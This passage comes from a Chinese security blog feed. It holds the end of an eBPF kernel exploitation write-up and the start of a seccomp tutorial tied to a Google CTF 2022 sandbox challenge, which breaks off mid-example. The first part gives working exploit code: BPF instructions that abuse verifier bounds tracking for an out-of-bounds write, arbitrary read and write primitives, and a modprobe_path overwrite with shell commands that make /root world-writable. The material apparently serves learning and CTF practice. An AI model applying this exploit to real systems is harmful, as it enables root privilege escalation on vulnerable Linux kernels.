class="number">0x4141414141414141</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">8</span>] = <span class="number">0xdeadbeefcafebabe</span>;</span><br><span class="line">write(socks[<span class="number">1</span>], payload, <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure>

<details class="note "><summary><p>此步完整的代码段</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> mapfd = map_create(<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span> verifier_log[<span class="number">0x10000</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> map_addr = leak_map_addr(mapfd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] map_addr =&gt; 0x%016lx\n&quot;</span>, map_addr);</span><br><span class="line"></span><br><span class="line">val = <span class="number">1</span>;</span><br><span class="line">map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R8 --&gt; context</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)  real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1)  real:1</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>), <span class="comment">// REG_2 &lt; 1 ? JMP $+2 : EXIT</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0	 real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 1 / actual: 0x10</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),			 <span class="comment">// arg2=offset  (0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_9),  <span class="comment">// arg3=to      (&amp;map[0])</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),  <span class="comment">// arg4=len     (0x10)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),  <span class="comment">// arg1=skb</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">    .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(insns[<span class="number">0</span>]),</span><br><span class="line">    .insns = (<span class="type">uint64_t</span>)insns,</span><br><span class="line">    .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL v2&quot;</span>,</span><br><span class="line">    .log_level = <span class="number">2</span>,</span><br><span class="line">    .log_size = <span class="keyword">sizeof</span>(verifier_log),</span><br><span class="line">    .log_buf = (<span class="type">uint64_t</span>)verifier_log,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> progfd = bpf(BPF_PROG_LOAD, &amp;prog_attr);</span><br><span class="line"><span class="keyword">if</span> (progfd == <span class="number">-1</span>) fatal(<span class="string">&quot;[-] bpf(BPF_PROG_LOAD)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks)) </span><br><span class="line">    fatal(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(<span class="type">int</span>)))</span><br><span class="line">    fatal(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] write.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> payload[<span class="number">0x10</span>];</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">0</span>] = <span class="number">0x4141414141414141</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;payload[<span class="number">8</span>] = <span class="number">0xdeadbeefcafebabe</span>;</span><br><span class="line">write(socks[<span class="number">1</span>], payload, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">map_lookup(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val = 0x%016lx\n&quot;</span>, val);</span><br></pre></td></tr></table></figure>

</details>

<p>执行结果如图，显然超出了 8 字节：</p>
<p><img src="/img/ebpf-12-10/1-8.png"></p>
<p><img src="/img/ebpf-12-10/1-9.png"></p>
<p>现在，在堆上的 oob write 已经实现了，剩下的可以用任何你喜欢的方式来利用。 例如，你可以把两张 BPF 映射并排放在一起，并覆写后面的映射的内容。接下来就利用 BPF 的特点来实现AAR&#x2F;AAW。</p>
<h2 id="AAR-x2F-AAW"><a href="#AAR-x2F-AAW" class="headerlink" title="AAR&#x2F;AAW"></a>AAR&#x2F;AAW</h2><p>回顾一下，指针可以被写入 BPF 栈。对存储在栈中的数据进行类型和范围追踪。因此可以尝试通过skb_load_bytes 在栈上进行的 oob write，覆写栈上的指针为数据包中构造好的数据。在被覆盖后，verifier 仍然将其识别为一个指针，因此可以读写我们构造的指针。如下图所示：</p>
<p><img src="/img/ebpf-12-10/1-10.png"></p>
<p>用 BPF_STX_MEM 放置指针在 FP-0x18，通过 oob write FP-0x20 就可以覆写该字段。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arbRead</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    ···</span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 1 / actual: 0x10</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),			 	  <span class="comment">// arg2=offset  (0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x20</span>),  <span class="comment">// arg3=to      (FP-0x20)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),       <span class="comment">// arg4=len     (0x10)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),       <span class="comment">// arg1=skb</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, <span class="number">-0x18</span>),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, <span class="number">-0x10</span>), <span class="comment">// *(u64 *)(fp-0x10)=reg2</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>), <span class="comment">// key</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),    </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>), <span class="comment">// value</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),              <span class="comment">// flags</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">    ···</span><br><span class="line">    <span class="comment">// FP-0x18 设置为一个指针值 (*) &amp;map[0]</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 1 / actual: 0x10</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, <span class="number">0x10</span><span class="number">-1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (*) 绕过 ALU sanitation</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG2, <span class="number">0</span>),              <span class="comment">// arg2=offset  (0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),     <span class="comment">// arg3=to      (FP-0x20)</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x20</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_1),      <span class="comment">// arg4=len     (0x10)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8),      <span class="comment">// arg1=skb</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reg0 = *(u64 *)(FP-0x18)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, <span class="number">-0x18</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 任意地址写</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_1, value &gt;&gt; <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, value &amp; <span class="number">0xffffffff</span>),</span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, <span class="number">0</span>), <span class="comment">// 偽ポインタへの書き込み</span></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="执行任意指令"><a href="#执行任意指令" class="headerlink" title="执行任意指令"></a>执行任意指令</h2><p>最终泄露了 kernel_base 以后，就可以通过任意地址写，将 “&#x2F;tmp&#x2F;x” 写入 modprobe_path。读取flag。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;echo -e &#x27;#!/bin/sh\nchmod -R 777 /root&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -e &#x27;\xde\xad\xbe\xef&#x27; &gt; /tmp/pwn&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/pwn&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/tmp/pwn&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/img/ebpf-12-10/1-11.png"></p>
<p><img src="/img/ebpf-12-10/res.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>ebpf 通过寄存器读&#x2F;写指定地址很方便，尤其是通过栈指针，像是在写更简洁的 shellcode。有一些绕过和 fake 的思路和 v8 很像，可能这就是 JIT 的相通性吧。</p>
<p>环境和完整的 exp 都可以在下面参考文章中找到。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
<li><a href="https://pawnyable.cafe/linux-kernel/LK06/exploit.html">eBPFのバグの悪用 | PAWNYABLE!</a></li>
<li><a href="https://pawnyable.cafe/linux-kernel/LK06/verifier.html">検証器とJITコンパイラ | PAWNYABLE!</a></li>
</ol>
]]></content>
      <categories>
        <category>知识学习</category>
      </categories>
      <tags>
        <tag>ebpf</tag>
      </tags>
  </entry>
  <entry>
    <title>seccomp和googlectf2022-S2</title>
    <url>/2023/01/04/seccomp%E5%92%8C%E6%9C%80%E8%BF%91%E9%81%87%E5%88%B0%E7%9A%84sandbox/</url>
    <content><![CDATA[<p>seccomp 的相关学习和 googlectf2022的一道沙箱题目-S2。</p>
<p><img src="/img/seccomp_ctf/chall.png"></p>
<span id="more"></span>

<h1 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">syscall</span><span class="params">(SYS_seccomp, <span class="type">unsigned</span> <span class="type">int</span> operation, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">void</span> *args)</span>;</span><br></pre></td></tr></table></figure>

<p>operations 有如下几种：SECCOMP_SET_MODE_STRICT， SECCOMP_SET_MODE_FILTER，SECCOMP_GET_ACTION_AVAIL (since Linux 4.14)，SECCOMP_GET_NOTIF_SIZES (since Linux 5.0)。</p>
<table>
<thead>
<tr>
<th>Operation</th>
<th>Desc</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>SECCOMP_SET_MODE_STRICT</td>
<td>only allow read, write, exit， sigreturn</td>
<td>0x0</td>
</tr>
<tr>
<td>SECCOMP_SET_MODE_FILTER</td>
<td>apply provided BPF in args</td>
<td>0x1</td>
</tr>
<tr>
<td>SECCOMP_GET_ACTION_AVAIL</td>
<td>Test to see if an action is supported by the kernel.</td>
<td>0x2</td>
</tr>
<tr>
<td>SECCOMP_GET_NOTIF_SIZES</td>
<td>Get the sizes of the seccomp user-space notification structures.</td>
<td>0x3</td>
</tr>
</tbody></table>
<h2 id="SECCOMP-SET-MODE-STRICT"><a href="#SECCOMP-SET-MODE-STRICT" class="headerlink" title="SECCOMP_SET_MODE_STRICT"></a>SECCOMP_SET_MODE_STRICT</h2><p>使用时 args 必须为 NULL。该 operation 和下面的调用相同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);</span><br></pre></td></tr></table></figure>

<h2 id="SECCOMP-SET-MODE-FILTER"><a href="#SECCOMP-SET-MODE-FILTER" class="headerlink" title="SECCOMP_SET_MODE_FILTER"></a>SECCOMP_SET_MODE_FILTER</h2><p>很常用的一个 operation，它允许我们定义一个指向 BPF 的指针，通过 args 参数进行传递。这个指针是一个指向<code>struct sock_fprog</code>结构体的指针；它可以指定过滤任意的系统调用和系统调用参数。如果<code>fork</code>和<code>clone</code>允许被调用，子进程的系统调用限制和其父进程相同。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog);</span><br></pre></td></tr></table></figure>

<p>为了使用 SECCOMP_SET_MODE_FILTER，调用线程必须在其 user namespace 中有 CAP_SYS_ADMIN。<strong>或者</strong>该线程必须已经设置了 no_new_privs 比特位。如果该比特位没有被其祖先设置，使用如下调用设置：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>);</span><br><span class="line">syscall(__NR_prctl,PR_SET_NO_NEW_PRIVS, <span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>当 flags 为 0 时，该 operation 和如下调用相同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, args);</span><br></pre></td></tr></table></figure>

<p>该 operations 可以使用如下 flags：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SECCOMP_FILTER_FLAG_LOG (since Linux 4.14)</span><br><span class="line">SECCOMP_FILTER_FLAG_NEW_LISTENER (since Linux 5.0)</span><br><span class="line">SECCOMP_FILTER_FLAG_SPEC_ALLOW (since Linux 4.17)</span><br><span class="line">SECCOMP_FILTER_FLAG_TSYNC</span><br></pre></td></tr></table></figure>

<p>其中 SECCOMP_FILTER_FLAG_NEW_LISTENER，当成功应用一个 filter 后，会返回一个新的用户空间的notification file descriptor。（该文件描述符设置了 close-on-exec 标志位）。当一个 filter 返回 SECCOMP_RET_USER_NOTIF，就会给这个文件描述符发送一个通知。一个线程最多可以应用一个使用SECCOMP_FILTER_FLAG_NEW_LISTENER 标志的 seccomp filter。</p>
<h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>当通过 SECCOMP_SET_MODE_FILTER 添加一个过滤器时，args 指向一个过滤器程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span></span><br><span class="line">               <span class="type">unsigned</span> <span class="type">short</span>      len;    <span class="comment">/* Number of BPF instructions */</span></span><br><span class="line">               <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span> <span class="comment">/* Pointer to array of</span></span><br><span class="line"><span class="comment">                                              BPF instructions */</span></span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>

<p>该程序必须包含 BPF 指令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>            <span class="comment">/* Filter block */</span></span><br><span class="line">               __u16 code;                 <span class="comment">/* Actual filter code */</span></span><br><span class="line">               __u8  jt;                   <span class="comment">/* Jump true */</span></span><br><span class="line">               __u8  jf;                   <span class="comment">/* Jump false */</span></span><br><span class="line">               __u32 k;                    <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>

<p>当执行指令时，BPF 程序将可用的系统调用信息使用以下形式的缓冲区进行操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">               <span class="type">int</span>   nr;                   <span class="comment">/* System call number */</span></span><br><span class="line">               __u32 arch;                 <span class="comment">/* AUDIT_ARCH_* value</span></span><br><span class="line"><span class="comment">                                              (see &lt;linux/audit.h&gt;) */</span></span><br><span class="line">               __u64 instruction_pointer;  <span class="comment">/* CPU instruction pointer */</span></span><br><span class="line">               __u64 args[<span class="number">6</span>];              <span class="comment">/* Up to 6 system call arguments */</span></span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>

<p>按照优先级递减的顺序，seccomp fileter 可能返回如下 action value：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SECCOMP_RET_KILL_PROCESS </span><br><span class="line">SECCOMP_RET_KILL_THREAD</span><br><span class="line">SECCOMP_RET_TRAP</span><br><span class="line">SECCOMP_RET_ERRNO</span><br><span class="line">SECCOMP_RET_USER_NOTIF</span><br><span class="line">SECCOMP_RET_TRACE</span><br><span class="line">SECCOMP_RET_LOG</span><br><span class="line">SECCOMP_RET_ALLOW</span><br></pre></td></tr></table></figure>

<h3 id="SECCOMP-RET-USER-NOTIF"><a href="#SECCOMP-RET-USER-NOTIF" class="headerlink" title="SECCOMP_RET_USER_NOTIF"></a>SECCOMP_RET_USER_NOTIF</h3><p>转发系统调用给 user-space 的监控进程并让其让其来决定如何处理该系统调用。<strong>通常当允许我们使用 seccomp 和 ioctl 系统调用时，我们可以创建一个 seccomp supervisor process 来使得某些 syscall 不会被 monitor trace 到。这也是解决一些题目的关键</strong>。如果没有监控进程则 filter 返回 ENOSYS。如果有优先级更高的 action value 返回，则监控进程不会被通知。</p>
<h3 id="SECCOMP-RET-TRACE"><a href="#SECCOMP-RET-TRACE" class="headerlink" title="SECCOMP_RET_TRACE"></a>SECCOMP_RET_TRACE</h3><p>其中当返回 SECCOMP_RET_TRACE 时，该值会使内核尝试通知 ptrace。如果没有 tracer 存在，系统调用就不会执行并返回失败状态。使用ptrace(PTRACE_SETOPTIONS)申请 PTRACE_O_TRACESECCOMP 的 tracer 会被通知PTRACE_EVENT_SECCOMP，filter 返回值的 SECCOMP_RET_DATA 部分将通过 PTRACE_GETEVENTMSG 提供给 tracer。tracer 可以通过将系统调用号更改为 -1 来跳过系统调用。或者，tracer 可以通过将系统调用号改为有效的系统调用号来更改所请求的系统调用。如果跟踪程序请求跳过系统调用，则系统调用将显示为 tracer 放入返回值寄存器中的值。当有优先级高于 SECCOMP_RET_TRACE 的 action value 返回时，tracer 将不会被通知。</p>
<h2 id="Seccomp-specific-BPF-details"><a href="#Seccomp-specific-BPF-details" class="headerlink" title="Seccomp-specific BPF details"></a>Seccomp-specific BPF details</h2><ul>
<li>所有的 operations 必须 load 和 store 4 字节的数据：BPF_W</li>
<li>使用 BPF_ABS 寻址模式修饰符来访问 seccomp_data 缓冲区中的内容</li>
<li>BPF_LEN寻址模式修饰符产生一个立即模式操作数，其值是 seccomp_data 缓冲区的大小。</li>
</ul>
<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc ./seccomp.c -o seccomp_test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> X32_SYSCALL_BIT 0x40000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">install_filter</span><span class="params">(<span class="type">int</span> syscall_nr, <span class="type">int</span> t_arch, <span class="type">int</span> f_errno)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> upper_nr_limit = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assume that AUDIT_ARCH_X86_64 means the normal x86-64 ABI</span></span><br><span class="line"><span class="comment">              (in the x32 ABI, all system calls have bit 30 set in the</span></span><br><span class="line"><span class="comment">              &#x27;nr&#x27; field, meaning the numbers are &gt;= X32_SYSCALL_BIT). */</span></span><br><span class="line">    <span class="keyword">if</span> (t_arch == AUDIT_ARCH_X86_64)</span><br><span class="line">        upper_nr_limit = X32_SYSCALL_BIT - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        <span class="comment">/* [0] 从 &#x27;seccomp_data&#x27; 中加载架构信息到累加器中. */</span></span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                 (offsetof(<span class="keyword">struct</span> seccomp_data, arch))),</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [1] Jump forward 5 instructions if architecture does not</span></span><br><span class="line"><span class="comment">                      match &#x27;t_arch&#x27;. */</span></span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, t_arch, <span class="number">0</span>, <span class="number">3</span>),</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [2] Load system call number from &#x27;seccomp_data&#x27; buffer into</span></span><br><span class="line"><span class="comment">                      accumulator. */</span></span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                 (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [3] Check ABI - only needed for x86-64 in deny-list use</span></span><br><span class="line"><span class="comment">                      cases.  Use BPF_JGT instead of checking against the bit</span></span><br><span class="line"><span class="comment">                      mask to avoid having to reload the syscall number. */</span></span><br><span class="line">        <span class="comment">// BPF_JUMP(BPF_JMP | BPF_JGT | BPF_K, upper_nr_limit, 3, 0),</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [4] Jump forward 1 instruction if system call number</span></span><br><span class="line"><span class="comment">                      does not match &#x27;syscall_nr&#x27;. */</span></span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, syscall_nr, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* [6] Destination of system call number mismatch: allow other</span></span><br><span class="line"><span class="comment">                      system calls. */</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [5] Matching architecture and system call: don&#x27;t execute</span></span><br><span class="line"><span class="comment">                  the system call, and return &#x27;f_errno&#x27; in &#x27;errno&#x27;. */</span></span><br><span class="line">        <span class="comment">// 